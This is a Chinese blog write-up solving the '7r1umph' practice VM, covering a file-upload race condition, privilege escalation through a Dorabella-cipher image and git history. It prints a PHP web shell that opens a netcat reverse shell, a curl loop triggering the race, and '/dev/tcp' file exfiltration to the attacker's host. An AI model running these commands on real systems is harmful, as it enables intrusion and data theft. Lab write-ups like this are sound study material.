---
title: "群友靶机之7r1umph"
date: "2025-12-24 21:06:56"
tags: ["渗透测试"]
categories: ["群友靶机"]
url: "/posts/47096.html"
abbrlink: "47096"
---

获取靶机地址：https://maze-sec.com/

QQ群：`660930334`

# 配置：

```
靶机用VirtualBox制作，VMware导入可能网卡不兼容
用户:todd 密码:qq660930334
1. 启动虚拟机时按`e`键进入GRUB编辑模式
2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`
3. 按Ctrl+X启动进入单用户模式
vim /etc/network/interfaces
allow-hotplug ens33
iface ens33 inet dhcp

ip link set ens33 up
dhclient ens33

reboot -f
```

# 端口扫描

![image-20251224205102268](/images/image-20251224205102268.png)

```
依旧是22,80端口
```

# 目录扫描

![image-20251213172111329](/images/image-20251213172111329.png)

```
index.php有一个上传口，/upload和/tmp是可访问文件目录口，/info.php是php的phpinfo，抓包走一遍文件上传逻辑
```

![image-20251213173648047](/images/image-20251213173648047.png)

![image-20251213173657998](/images/image-20251213173657998.png)

```
文件上传的时候没啥限制，发现上传之后会在upload上但是后缀名加成.dsz,也会出现在/tmp上但是再点击的时候，就显示404，该文件也消失掉了，那思路应该就是这里了文件上传会短时间的到临时目录上，这时候条件竞争让文件解析，反弹shell，
```

# 条件竞争反弹shell

![image-20251213180807658](/images/image-20251213180807658.png)

```
在这里构造的反弹shell的php代码要注意info中的禁用函数，不然效果不是很好，想到了用exec但是还是一直不行，看了这个博客才反弹出来的。
```

[7r1umph 靶机渗透测试报告 (Write-up)](https://7r1umph.top/post/7r1umph -ba-ji-shen-tou-ce-shi-bao-gao- (Write-up).html#1.-目标信息)

```
<?php
exec("busybox nc 192.168.44.128 4444 -e bash");
?>
```

```
同时一直访问，和设置监听端口就好了
for i in $(seq 1000);do curl -s http://192.168.44.148/tmp/shell.php ;done
nc -lvnp 4444
```

![image-20251213180549551](/images/image-20251213180549551.png)

![image-20251213181107473](/images/image-20251213181107473.png)

# 权限提升

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```
发现有个用户welcome，接下来就是翻翻模式了,发现有个文件和图片先看看文件，这里显示乱码，终端问题，先看图片去了
```

![image-20251213181650460](/images/image-20251213181650460.png)

![image-20251213181701630](/images/image-20251213181701630.png)

![image-20251213181752952](/images/image-20251213181752952.png)

![image-20251213182014524](/images/image-20251213182014524.png)

```
cat yeyeye.png > /dev/tcp/192.168.44.128/4444
nc -lvnp 4444 > yeyeye.png
```

![yeyeye](/images/yeyeye.png)

```
感觉像一种编码的符号，思路是用户密码是不是被加密了，进这个dcode.fr里面chiffres-symbol找，看看有没有相应的编码方式--Chiffre Dorabella yecongdong
```

![image-20251213183513878](/images/image-20251213183513878.png)

# 权限再提升

```
ssh welcome@192.168.44.143  yecongdong
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image-20251213190322163](/images/image-20251213190322163.png)

![image-20251213184605556](/images/image-20251213190614896.png)

![image-20251213184640035](/images/image-20251213184640035.png)

```
怀疑点一个是.git，一个是RegView.sh,这个脚本是一个学习正则的，tmux终端真的难用又不能滚轮啥的好麻烦
```

![image-20251213184900788](/images/image-20251213184900788.png)

```
cat RegView.sh > /dev/tcp/192.168.44.128/4444
nc -lvnp 4444 > RegView.sh
```

![image-20251213190005371](/images/image-20251213190005371.png)

```
输入yeyeye，就去执行yeyeye。构造恶意文件yeyeye去执行？也没有存在配置不当的SUID文件，回头看看.git再来
```

![image-20251213191059903](/images/image-20251213191059903.png)

```
查看添加的soure2.txt文件，拿到root凭证
```

![image-20251213191454622](/images/image-20251213191454622.png)

![image-20251213191603224](/images/image-20251213191603224.png)

# 总结

```
在反弹shell一直打不通的时候想找其他语句来着，结果找到了wp[7r1umph 靶机渗透测试报告 
(Write-up)](https://7r1umph.top/post/7r1umph -ba-ji-shen-tou-ce-shi-bao-gao- (Write-up).html#1.-目标信息)，还有群主的讲解视频 

https://www.bilibili.com/video/BV1QodBYCE9t/?share_source=copy_web&vd_source=46dcac097257d547144350b30f96978c，就不是纯自己做的了。总体来说还好吧条件竞争-->Dorabella编码--->git历史命令，但是没有想到guess的md5就是root的密码，还是太超模了
```
